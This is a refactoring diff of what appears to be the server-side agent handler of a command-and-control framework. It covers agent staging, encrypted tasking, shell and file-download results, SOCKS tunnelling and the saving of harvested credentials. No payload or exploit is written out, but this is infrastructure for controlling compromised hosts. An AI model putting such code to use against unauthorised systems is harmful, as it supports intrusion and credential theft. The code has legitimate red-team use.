-            #     autorunCmds.extend(["lastautoruncmd"])
-            #     self.mainMenu.resourceQueue.extend(autorunCmds)
-            #     try:
-            #         # this will cause the cmdloop() to start processing the autoruns
-            #         self.mainMenu.do_agents("kickit")
-            #     except Exception as e:
-            #         if e == "endautorun":
-            #             pass
-            #         else:
-            #             log.info("End of Autorun Queue")
-
-            return f"STAGE2: {sessionID}"
+            return f"STAGE2: {session_id}"
 
         else:
-            message = f"Invalid staging request packet from {sessionID} at {clientIP} : {meta}"
+            message = f"Invalid staging request packet from {session_id} at {client_ip} : {meta}"
             log.error(message)
 
     def handle_agent_data(
         self,
-        stagingKey,
-        routingPacket,
-        listenerOptions,
-        clientIP="0.0.0.0",
+        staging_key,
+        routing_packet,
+        listener_options,
+        client_ip="0.0.0.0",
         update_lastseen=True,
     ):
         """
@@ -1104,108 +673,101 @@ class Agents:
 
         Abstracted out sufficiently for any listener module to use.
         """
-        if len(routingPacket) < 20:
-            message = (
-                f"handle_agent_data(): routingPacket wrong length: {len(routingPacket)}"
-            )
+        if len(routing_packet) < 20:
+            message = f"handle_agent_data(): routingPacket wrong length: {len(routing_packet)}"
             log.error(message)
             return None
 
-        if isinstance(routingPacket, str):
-            routingPacket = routingPacket.encode("UTF-8")
-        routingPacket = packets.parse_routing_packet(stagingKey, routingPacket)
-        if not routingPacket:
+        if isinstance(routing_packet, str):
+            routing_packet = routing_packet.encode("UTF-8")
+        routing_packet = packets.parse_routing_packet(staging_key, routing_packet)
+        if not routing_packet:
             return [("", "ERROR: invalid routing packet")]
 
         dataToReturn = []
 
         # process each routing packet
-        for sessionID, (language, meta, additional, encData) in routingPacket.items():
+        for session_id, (language, meta, additional, encData) in routing_packet.items():
             if meta == "STAGE0" or meta == "STAGE1" or meta == "STAGE2":
-                message = f"handle_agent_data(): sessionID {sessionID} issued a {meta} request"
+                message = f"handle_agent_data(): session_id {session_id} issued a {meta} request"
                 log.debug(message)
 
                 with SessionLocal.begin() as db:
                     dataToReturn.append(
                         (
                             language,
-                            self.handle_agent_staging(
-                                sessionID,
+                            self._handle_agent_staging(
+                                db,
+                                session_id,
                                 language,
                                 meta,
                                 additional,
                                 encData,
-                                stagingKey,
-                                listenerOptions,
-                                clientIP,
-                                db,
+                                staging_key,
+                                listener_options,
+                                client_ip,
                             ),
                         )
                     )
 
-            elif sessionID not in self.agents:
-                message = f"handle_agent_data(): sessionID {sessionID} not present"
+            elif session_id not in self.agents:
+                message = f"handle_agent_data(): session_id {session_id} not present"
                 log.warning(message)
 
-                dataToReturn.append(("", f"ERROR: sessionID {sessionID} not in cache!"))
+                dataToReturn.append(
+                    ("", f"ERROR: session_id {session_id} not in cache!")
+                )
 
             elif meta == "TASKING_REQUEST":
-                message = f"handle_agent_data(): sessionID {sessionID} issued a TASKING_REQUEST"
+                message = f"handle_agent_data(): session_id {session_id} issued a TASKING_REQUEST"
                 log.debug(message)
                 dataToReturn.append(
                     (
                         language,
-                        self.handle_agent_request(sessionID, language, stagingKey),
+                        self.handle_agent_request(session_id, language, staging_key),
                     )
                 )
 
             elif meta == "RESULT_POST":
                 message = (
-                    f"handle_agent_data(): sessionID {sessionID} issued a RESULT_POST"
+                    f"handle_agent_data(): session_id {session_id} issued a RESULT_POST"
                 )
                 log.debug(message)
                 dataToReturn.append(
                     (
                         language,
-                        self.handle_agent_response(sessionID, encData, update_lastseen),
+                        self._handle_agent_response(
+                            session_id, encData, update_lastseen
+                        ),
                     )
                 )
 
             else:
-                message = f"handle_agent_data(): sessionID {sessionID} gave unhandled meta tag in routing packet: {meta}"
+                message = f"handle_agent_data(): session_id {session_id} gave unhandled meta tag in routing packet: {meta}"
                 log.error(message)
         return dataToReturn
 
-    def handle_agent_request(
-        self, sessionID, language, stagingKey, update_lastseen=True
-    ):
+    def handle_agent_request(self, session_id, language, staging_key):
         """
         Update the agent's last seen time and return any encrypted taskings.
-
-        TODO: does this need self.lock?
         """
-        if sessionID not in self.agents:
-            message = f"handle_agent_request(): sessionID {sessionID} not present"
+        if session_id not in self.agents:
+            message = f"handle_agent_request(): sessionID {session_id} not present"
             log.error(message)
             return None
 
         with SessionLocal.begin() as db:
-            # update the client's last seen time
-            # It's possible updating the last seen time over and over
-            # contributes to write contention
-            if update_lastseen:
-                self.update_agent_lastseen_db(sessionID, db)
+            self.agent_service.update_agent_lastseen(db, session_id)
 
-            # retrieve all agent taskings from the cache
-            taskings = self.get_queued_agent_tasks_db(sessionID, db)
-            temp_taskings = self.get_queued_agent_temporary_tasks(sessionID)
-            taskings.extend(temp_taskings)
+            tasks = self._get_queued_agent_tasks(db, session_id)
+            temp_tasks = self._get_queued_agent_temporary_tasks(session_id)
+            tasks.extend(temp_tasks)
 
-            if taskings and taskings != []:
+            if len(tasks) > 0:
                 all_task_packets = b""
 
                 # build tasking packets for everything we have
-                for tasking in taskings:
+                for tasking in tasks:
                     input_full = tasking.input_full
                     if tasking.task_name == "TASK_CSHARP":
                         with open(tasking.input_full.split("|")[0], "rb") as f:
@@ -1216,16 +778,14 @@ class Agents:
                         tasking.task_name, input_full, tasking.id
                     )
                 # get the session key for the agent
-                session_key = self.agents[sessionID]["sessionKey"]
+                session_key = self.agents[session_id]["sessionKey"]
 
-                if self.agents[sessionID]["language"].lower() in [
+                if self.agents[session_id]["language"].lower() in [
                     "python",
                     "ironpython",
                 ]:
-                    try:
+                    with suppress(Exception):
                         session_key = bytes.fromhex(session_key)
-                    except Exception:
-                        pass
 
                 # encrypt the tasking packets with the agent's session key
                 encrypted_data = encryption.aes_encrypt_then_hmac(
@@ -1233,8 +793,8 @@ class Agents:
                 )
 
                 return packets.build_routing_packet(
-                    stagingKey,
-                    sessionID,
+                    staging_key,
+                    session_id,
                     language,
                     meta="SERVER_RESPONSE",
                     encData=encrypted_data,
@@ -1242,22 +802,20 @@ class Agents:
 
         return None
 
-    def handle_agent_response(self, sessionID, encData, update_lastseen=False):
+    def _handle_agent_response(self, session_id, enc_data, update_lastseen=False):
         """
         Takes a sessionID and posted encrypted data response, decrypt
         everything and handle results as appropriate.
-
-        TODO: does this need self.lock?
         """
-        if sessionID not in self.agents:
-            message = f"handle_agent_response(): sessionID {sessionID} not in cache"
+        if session_id not in self.agents:
+            message = f"handle_agent_response(): sessionID {session_id} not in cache"
             log.error(message)
             return None
 
         # extract the agent's session key
-        sessionKey = self.agents[sessionID]["sessionKey"]
+        sessionKey = self.agents[session_id]["sessionKey"]
 
-        if self.agents[sessionID]["language"].lower() in ["python", "ironpython"]:
+        if self.agents[session_id]["language"].lower() in ["python", "ironpython"]:
             try:
                 sessionKey = bytes.fromhex(sessionKey)
             except Exception:
@@ -1265,7 +823,7 @@ class Agents:
 
         try:
             # verify, decrypt and depad the packet
-            packet = encryption.aes_decrypt_and_verify(sessionKey, encData)
+            packet = encryption.aes_decrypt_and_verify(sessionKey, enc_data)
 
             # process the packet and extract necessary data
             responsePackets = packets.parse_result_packets(packet)
@@ -1282,25 +840,27 @@ class Agents:
                 # process the agent's response
                 with SessionLocal.begin() as db:
                     if update_lastseen:
-                        self.update_agent_lastseen_db(sessionID, db)
+                        self.agent_service.update_agent_lastseen(db, session_id)
 
-                    self.process_agent_packet(sessionID, responseName, taskID, data, db)
+                    self._process_agent_packet(
+                        db, session_id, responseName, taskID, data
+                    )
                 results = True
             if results:
                 # signal that this agent returned results
-                message = f"Agent {sessionID} returned results."
+                message = f"Agent {session_id} returned results."
                 log.info(message)
 
             # return a 200/valid
             return "VALID"
 
         except Exception as e:
-            message = f"Error processing result packet from {sessionID} : {e}"
+            message = f"Error processing result packet from {session_id} : {e}"
             log.error(message, exc_info=True)
             return None
 
-    def process_agent_packet(
-        self, session_id, response_name, task_id, data, db: Session
+    def _process_agent_packet(
+        self, db: Session, session_id, response_name, task_id, data
     ):
         """
         Handle the result packet based on sessionID and responseName.
@@ -1370,7 +930,7 @@ class Agents:
             if isinstance(data, bytes):
                 data = data.decode("UTF-8")
             # update the agent log
-            self.save_agent_log(session_id, "Error response: " + data)
+            self.agent_service.save_agent_log(session_id, "Error response: " + data)
 
         elif response_name == "TASK_SYSINFO":
             # sys info response -> update the host info
@@ -1402,7 +962,7 @@ class Agents:
                 username = f"{domainname}\\{username}"
 
                 # update the agent with this new information
-                self.update_agent_sysinfo_db(
+                self.update_agent_sysinfo(
                     db,
                     session_id,
                     listener=listener,
@@ -1435,7 +995,7 @@ class Agents:
                 sysinfo += "{: <18}".format("Architecture:") + architecture + "\n"
 
                 # update the agent log
-                self.save_agent_log(session_id, sysinfo)
+                self.agent_service.save_agent_log(session_id, sysinfo)
 
         elif response_name == "TASK_EXIT":
             # exit command response
@@ -1444,55 +1004,31 @@ class Agents:
             log.error(message)
 
             # update the agent results and log
-            self.save_agent_log(session_id, data)
+            self.agent_service.save_agent_log(session_id, data)
 
             # set agent to archived in the database
             agent.archived = True
 
             # Close socks client
-            if session_id in self.socksthread:
-                agent.socks = False
-                self.socksclient[session_id].shutdown()
-                time.sleep(1)
-                self.socksthread[session_id].kill()
+            self.agent_socks_service.close_socks_client(agent)
 
         elif response_name == "TASK_SHELL":
             # shell command response
             # update the agent log
-            self.save_agent_log(session_id, data)
+            self.agent_service.save_agent_log(session_id, data)
 
         elif response_name == "TASK_CSHARP":
             # shell command response
             # update the agent log
-            self.save_agent_log(session_id, data)
+            self.agent_service.save_agent_log(session_id, data)
 
         elif response_name == "TASK_SOCKS":
-            if session_id not in self.socksthread:
-                try:
-                    log.info(f"Starting SOCKS client for {session_id}")
-                    self.socksqueue[session_id] = queue.Queue()
-                    client = create_client(
-                        self.mainMenu, self.socksqueue[session_id], session_id
-                    )
-                    self.socksthread[session_id] = KThread(
-                        target=start_client,
-                        args=(client, agent.socks_port),
-                    )
+            self.agent_socks_service.start_socks_client(agent)
 
-                    self.socksclient[session_id] = client
-                    self.socksthread[session_id].daemon = True
-                    self.socksthread[session_id].start()
-
-                    log.info(f'SOCKS client for "{agent.name}" successfully started')
-                except Exception:
-                    log.error(f'SOCKS client for "{agent.name}" failed to started')
-            else:
-                log.info("SOCKS server already exists")
-
-            self.save_agent_log(session_id, data)
+            self.agent_service.save_agent_log(session_id, data)
 
         elif response_name == "TASK_SOCKS_DATA":
-            self.socksqueue[session_id].put(base64.b64decode(data))
+            self.agent_socks_service.queue_socks_data(agent, base64.b64decode(data))
             return
 
         elif response_name == "TASK_DOWNLOAD":
@@ -1509,51 +1045,41 @@ class Agents:
                 # decode the file data and save it off as appropriate
                 file_data = helpers.decode_base64(data.encode("UTF-8"))
 
-                if index == "0":
-                    self.save_file(
-                        session_id,
-                        path,
-                        file_data,
-                        filesize,
-                        tasking,
-                        agent.language,
-                        db,
-                    )
-                else:
-                    self.save_file(
-                        session_id,
-                        path,
-                        file_data,
-                        filesize,
-                        tasking,
-                        agent.language,
-                        db,
-                        append=True,
-                    )
+                self.save_file(
+                    db,
+                    session_id,
+                    path,
+                    file_data,
+                    filesize,
+                    tasking,
+                    agent.language,
+                    append=index != "0",
+                )
+
                 # update the agent log
                 msg = f"file download: {path}, part: {index}"
-                self.save_agent_log(session_id, msg)
+                self.agent_service.save_agent_log(session_id, msg)
 
         elif response_name == "TASK_DIR_LIST":
             try:
                 result = json.loads(data.decode("utf-8"))
-                self.update_dir_list(session_id, result, db=db)
+                self._update_dir_list(db, session_id, result)
             except ValueError:
                 pass
 
-            self.save_agent_log(session_id, data)
+            self.agent_service.save_agent_log(session_id, data)
 
         elif response_name == "TASK_GETDOWNLOADS":
             if not data or data.strip().strip() == "":
                 data = "[*] No active downloads"
 
             # update the agent log
-            self.save_agent_log(session_id, data)
+            self.agent_service.save_agent_log(session_id, data)
 
         elif response_name == "TASK_STOPDOWNLOAD":
             # download kill response
             # update the agent log
-            self.save_agent_log(session_id, data)
+            self.agent_service.save_agent_log(session_id, data)
 
         elif response_name == "TASK_UPLOAD":
             pass
@@ -1564,12 +1090,12 @@ class Agents:
 
             # running jobs
             # update the agent log
-            self.save_agent_log(session_id, data)
+            self.agent_service.save_agent_log(session_id, data)
 
         elif response_name == "TASK_STOPJOB":
             # job kill response
             # update the agent log
-            self.save_agent_log(session_id, data)
+            self.agent_service.save_agent_log(session_id, data)
 
         elif response_name == "TASK_CMD_WAIT":
             # dynamic script output -> blocking
@@ -1587,7 +1113,7 @@ class Agents:
 
                     os_details = agent.os_details
 
-                    self.mainMenu.credentialsv2.create_credential(
+                    self.credential_service.create_credential(
                         #  idk if i want to import api dtos here, but it's not a big deal for now.
                         db,
                         CredentialPostRequest(
@@ -1603,7 +1129,7 @@ class Agents:
                     )
 
             # update the agent log
-            self.save_agent_log(session_id, data)
+            self.agent_service.save_agent_log(session_id, data)
 
         elif response_name == "TASK_CMD_WAIT_SAVE":
             # dynamic script output -> blocking, save data
@@ -1626,7 +1152,7 @@ class Agents:
 
             # update the agent log
             msg = f"Output saved to .{final_save_path}"
-            self.save_agent_log(session_id, msg)
+            self.agent_service.save_agent_log(session_id, msg)
 
             # attach file to tasking
             download = models.Download(
@@ -1679,7 +1205,7 @@ class Agents:
 
                         os_details = agent.os_details
 
-                        self.mainMenu.credentialsv2.create_credential(
+                        self.credential_service.create_credential(
                             #  idk if i want to import api dtos here, but it's not a big deal for now.
                             db,
                             CredentialPostRequest(
@@ -1695,7 +1221,7 @@ class Agents:
                         )
 
                 # update the agent log
-                self.save_agent_log(session_id, data)
+                self.agent_service.save_agent_log(session_id, data)
 
             # TODO: redo this regex for really large AD dumps
             #   so a ton of data isn't kept in memory...?
@@ -1719,7 +1245,7 @@ class Agents:
 
                         os_details = agent.os_details
 
-                        self.mainMenu.credentialsv2.create_credential(
+                        self.credential_service.create_credential(
                             #  idk if i want to import api dtos here, but it's not a big deal for now.
                             db,
                             CredentialPostRequest(
@@ -1754,27 +1280,27 @@ class Agents:
 
             # update the agent log
             msg = f"Output saved to .{final_save_path}"
-            self.save_agent_log(session_id, msg)
+            self.agent_service.save_agent_log(session_id, msg)
 
         elif response_name == "TASK_SCRIPT_IMPORT":
             # update the agent log
-            self.save_agent_log(session_id, data)
+            self.agent_service.save_agent_log(session_id, data)
 
         elif response_name == "TASK_IMPORT_MODULE":
             # update the agent log
-            self.save_agent_log(session_id, data)
+            self.agent_service.save_agent_log(session_id, data)
 
         elif response_name == "TASK_VIEW_MODULE":
             # update the agent log
-            self.save_agent_log(session_id, data)
+            self.agent_service.save_agent_log(session_id, data)
 
         elif response_name == "TASK_REMOVE_MODULE":
             # update the agent log
-            self.save_agent_log(session_id, data)
+            self.agent_service.save_agent_log(session_id, data)
 
         elif response_name == "TASK_SCRIPT_COMMAND":
             # update the agent log
-            self.save_agent_log(session_id, data)
+            self.agent_service.save_agent_log(session_id, data)
 
         elif response_name == "TASK_SWITCH_LISTENER":
             # update the agent listener
@@ -1786,14 +1312,14 @@ class Agents:
             agent.listener = listener_name
 
             # update the agent log
-            self.save_agent_log(session_id, data)
+            self.agent_service.save_agent_log(session_id, data)
             message = f"Updated comms for {session_id} to {listener_name}"
             log.info(message)
 
         elif response_name == "TASK_UPDATE_LISTENERNAME":
             # The agent listener name variable has been updated agent side
             # update the agent log
-            self.save_agent_log(session_id, data)
+            self.agent_service.save_agent_log(session_id, data)
             message = f"Listener for '{session_id}' updated to '{data}'"
             log.info(message)
 
